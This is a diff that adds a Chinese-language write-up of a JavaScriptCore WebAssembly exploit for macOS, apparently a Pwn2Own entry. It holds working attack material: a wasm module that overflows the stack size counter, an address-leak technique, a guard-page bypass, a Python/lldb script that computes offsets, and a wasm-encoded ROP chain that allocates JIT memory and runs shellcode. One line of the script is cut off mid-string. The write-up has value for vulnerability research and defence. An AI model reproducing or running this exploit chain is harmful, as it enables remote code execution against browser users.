@@ -1,0 +1,179 @@
+  * 为了解决这个问题, 我们可以把2^32个返回值分给16个块, 使这些块相互嵌套, 每个块都具有0x10000000个返回值, 每个块都有自己的表达式栈, 最终设置m_maxStackSize为0xffffffff, 一旦解析结束就会完成溢出
+    (module
+      (type (;0;) (func))
+      (type (;1;) (func (result f64 f64 ... )))  ;; a lot of f64 (f64 * 0x10000000)
+      (type (;2;) (func (param i64 i64)))
+      (import "e" "mem" (memory (;0;) 1))
+      (func (;0;) (type 2) (param i64 i64)
+        ;; "real" code we want to execute can be placed here
+        i32.const 1                                            ;; use 'br_if', or the following code would be 'dead_code'
+        br_if 0 (;@0;)                                         ;; 
+        block  ;; label = @1                                   ;; begin to fill 32GB
+          block (result f64 f64 ... )  ;; label = @2                ;; push m_maxStackSize to 0xffffffff
+            unreachable                                        ;; then m_numCalleeLocals = 0x0
+          end                                                  ;; when parsing completes.
+          ;; current stack has 0x10000000 values, m_maxStackSize = 0x10000000
+          block  ;; label = @2
+            ;; new block has an empty expression stack
+            block (result f64 f64 ... )  ;; label = @3
+              unreachable
+            end
+            ;; current stack has 0x10000000 values, m_maxStackSize = 0x20000000
+            block  ;; label = @3
+              block (result f64 f64 ... )  ;; label = @4
+                unreachable
+              end
+                ......
+              br 0 (;@3;)
+            end
+            br 0 (;@2;)
+          end
+          br 0 (;@1;)
+        end
+        return)
+      (func (;1;) (type 0)
+        i64.const 0
+        i64.const 0
+        call 0)
+      (export "rets" (func 1)))
+  * 这样构造出的每个块大约占用2GB内存, 16个块加起来将消耗32GB, 看起来很夸张, 在macOS内存压缩与SSD提供的swap配合下, 还是能够实现(pwn2own现场跑了3分半), 我给macOS虚拟机设置了8GB内存也能实现(就是有点吃硬盘)
+### 地址泄漏
+  * 成功触发漏洞, 将m_numCalleeLocals设置为0后, 接下来开始漏洞利用的过程, 此时我们调用wasm中的函数, LLInt将不会对降低栈帧, 导致以下的堆栈布局
+                | ...            |
+                | loc1           |
+                | loc0           |
+                | callee-saved 1 |
+                | callee-saved 0 |
+    rsp, rbp -> | previous rbp   |
+                | return address |
+  * 正如前面提到的, 此时栈上2个callee-saved以及14个loc[0~13], 是根据函数调用约定可预测的一段栈空间. 因此, 为了能够在wasm函数中访问loc0与loc1, 我们需要让函数声明接收两个`i64`参数
+        (type (;2;) (func (param i64 i64)))
+        (func (;0;) (type 2) (param i64 i64)
+  * 为了达成地址泄漏的目的, 需要触发LLInt的slow_path来进行处理, 因为在slow_path函数运行期间发生的任何push操作, 都会覆盖我们栈上的callee-saved与局部变量; 而当slow_path函数返回后, 我们由可以操作wasm的本地变量读取刚才的地址
+  * 一个名为`slow_path_wasm_out_of_line_jump_target`的slow_path函数, 适用于wasm模块中偏移量太大而无法直接以字节码格式编码的跳转分支, 在此, 至少为0x80的偏移量就可以
+    block
+      ;; branch out of block
+      ;; an unconditional `br 0` will not work as the filler would be dead code
+      i32.const 1
+      br_if 0
+      i32.const 0        ;; filler code here...
+      i32.popcnt         ;; such that the offset from the above branch
+      drop               ;; to the end of the block is >= 0x80
+      ......
+    end
+  * 至此即可触发LLInt对slow_path_wasm_out_of_line_jump_target, 执行时效果如下:
+  * 现在loc0中有一个返回地址, 该地址指向`JavaScriptCore dylib`中的一个固定偏移, 我们可以事先计算该偏移量, 以在程序运行时得到该dylib在内存中的基地址; loc1中则包含一个`当前的栈地址`; 这两者的信息为我们提供了远程代码执行所需的信息泄漏
+  * 在获取了泄露的地址之后, 还不能立即开始ROP链的实施, 有一些关于内存布局的小问题
+  * 当前我们所要执行的wasm函数没有被分配任何栈地址空间, 所以理论上在该函数内应该能够写入最大负偏移量(rbp-0x10000)以内的任意栈地址, 也就是说, 我们几乎可以覆盖当前堆栈下方的任意内存
+  * 者在主线程的上下文中并不是很有帮助, 因为主线程的栈下方没有任何可靠的映射. 然而, 线程的堆栈是从专用虚拟内存区域以递增的地址连续分配的
+    STACK GUARD   70000b255000-70000b256000 [ 4K   ] ---/rwx stack guard for thread 1
+    Stack         70000b256000-70000b2d8000 [ 520K ] rw-/rwx thread 1
+    STACK GUARD   70000b2d8000-70000b2d9000 [ 4K   ] ---/rwx stack guard for thread 2
+    Stack         70000b2d9000-70000b35b000 [ 520K ] rw-/rwx thread 2
+  * 如果我们的wasm函数在线程2中执行, 线程1的堆栈将会是损坏目标, 唯一的问题就是保护页, 然而, LLInt以原始的优化形式为我们提供了便利
+  * 当push一个常量值时, 生成器实际上并没有发出'将常量写入栈'的指令, 相反, 它将常量添加到'常量池‘当中, 之后对该常量的读取也不是从栈空间而是从常量池. 注意, 此时wasm模块已经进入运行阶段, 不要与解析阶段的栈操作相混淆
+        i32 .const  1
+        i32 .const  2
+        i32 .const  3
+        i32 .add
+  * 例如上面这个代码段, 实际上只有add操作时向栈push了5, 其余const并没有写入栈的操作. 利用这样的特性, 我们可以通过大量push未使用的常量值, 跳过保护页
+  * 综合一下, 在实际执行ROP链之前, 我们使用loc0减去事先计算好的偏移量, 获得JavaScriptCore dylib基地址; 使用loc1减去用于跳过保护页的常量数量, 获得一个受害者线程的栈地址;
+    block  ;; label = @1
+        local.get 0
+        i64.const 15337245    ;; subtract offset to JavaScriptCore dylib base 
+        i64.sub
+        local.set 0
+        local.get 1
+        i64.const 144312      ;; offset to where the ropchain will be
+        i64.sub
+        local.set 1
+        i64.const 0           ;; push a ton of constants to hop over the guard page
+        i64.const 0
+        ......
+        local.get 0
+        i64.const 15347       ;; ROP begin
+        i64.add               ;; nop
+        drop
+        drop
+        ;; write ROP chain to stack
+    end
+  * 一直到了这一步, 可以发现针对这个漏洞, 并不需要像目前主流的浏览器漏洞利用那样, 构造`addrof()`和`fakeobj()`来渐进式的获取漏洞利用, 而是一个很不错的老式ROP链即可
+  * 关于如何计算JavaScriptCore dylib基地址, 可以使用从shared_cache中获取的方式, 在对应版本的系统中使用以下python方法即可, 总体思路就是debug JavaScriptCore, 从调试器中获取目标方法的第一个call指令, 到基地址的偏移量即为我们需要的leak_off. (小坑: 如果脚本停在`lldb.recvuntil("\n\n")`里没有返回的话, 检查一下你的lldb dis指令结束时是否少一个换行符, 按实际需要修改脚本即可)
+    def get_jsc_offsets_from_shared_cache():
+        open("/tmp/t.c", "w").write('''
+        #include 
+        int main() {
+            dlopen("/System/Library/Frameworks/JavaScriptCore.framework/Versions/A/JavaScriptCore", RTLD_LAZY);
+            asm volatile("int3");
+            return 0;
+        }
+        ''')
+        os.system("clang /tmp/t.c -o /tmp/t")
+        lldb = subprocess.Popen(["lldb","--no-lldbinit","/tmp/t"], bufsize=0, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+        lldb.sendline = lambda s: lldb.stdin.write(s.encode('utf-8')+b'\n')
+        def m_recvuntil(s):
+            s = s.encode('utf-8')
+            buf = b""
+            while not buf.endswith(s):
+                buf += lldb.stdout.read(1)
+            return buf
+        lldb.recvuntil = m_recvuntil
+        try:
+            lldb.sendline("settings set target.x86-disassembly-flavor intel")
+            lldb.sendline("r")
+            lldb.recvuntil("stopped")
+            lldb.sendline("ima list -h JavaScriptCore")
+            lldb.recvuntil("0] ")
+            jsc_base = int(lldb.recvuntil("\n")[:-1], 16)
+            lldb.sendline("dis -n slow_path_wasm_out_of_line_jump_target")
+            lldb.recvuntil("JavaScriptCore`slow_path_wasm_out_of_line_jump_target:\n")
+            disas = lldb.recvuntil("\n\n").decode("utf-8")
+            disas = disas.split('\n')
+            disas = [disas[i] for i in range(1,len(disas)) if "call " in disas[i-1]][0]
+            leak_off = int(disas.split(' 
+    i64.add ;; the addition will write the gadget to the stack
+  * 要在栈中写入常量可以使用loc1作为基地址, 使用按位或操作, 或是使用常量0来完成
+  * ROP链是为了调起并保证shellcode的执行, 由于macOS中SIP(系统完整性保护)机制的存在, 内存页面的RWX属性仅当存在一特定标志时生效, `MAP_JIT(0x800)`, 而该标志仅在mmap创建时授予.
+  * 线程堆栈并未被映射为MAP_JIT, 所以我们不能简单的使用`mprotect`将shellcode放在栈上并返回调用到它
+  * 为解决此问题, 我们将调用函数`ExecutableAllocator::allocate`, 以在现有的rwx JIT区域中保留一个地址, 然后使用`memcpy`将shellcode放在那里, 最终返回到它并执行
+  * 最终ROP链在wasm中的样子: 
+          local.get 0
+          i64.const 4627172                              ;; pop_rdi
+          i64.add
+          drop
+          drop
+          local.get 1
+          i64.const 80
+          i64.add
+          drop
+          drop
+          local.get 0
+          i64.const 3993325                              ;; pop rdx
+          i64.add
+          drop
+          drop
+          i64.const 144                                  ;; len(shellcode)
+          i64.const 0
+          i64.or
+          drop
+          drop
+          local.get 0
+          i64.const 917851                               ;; pop rcx
+          i64.add
+          drop
+          drop
+          i64.const 1
+          i64.const 0
+          i64.or
+          drop
+          drop
+          local.get 0
+          i64.const 10101216       ;; syms['__ZN3JSC19ExecutableAllocator8allocateEmNS_20JITCompilationEffortE']
+          i64.add
+          drop
+          drop
+          local.get 0
+          i64.const 4627172                               ;; pop rdi
+          i64.add
+          drop
+          drop
